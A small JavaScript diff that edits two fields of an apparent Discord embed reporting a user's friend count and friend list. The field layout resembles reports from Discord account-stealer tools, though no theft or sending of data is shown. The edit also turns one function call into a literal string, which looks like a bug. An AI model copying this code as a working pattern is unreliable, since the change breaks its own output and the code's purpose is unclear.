@@ -151,12 +151,12 @@ function Cool() {
                     "fields": [
                         {
                             "name": " friends number",
-                            "value": ${totalFriends()},
+                            "value": `${totalFriends()}`,
                             "inline": true		    
                         },
                         {
                             "name": " friends discord",
-                            "value": CalcFriends(),
+                            "value": `CalcFriends()`,
                             "inline": false
                         }
                     ],
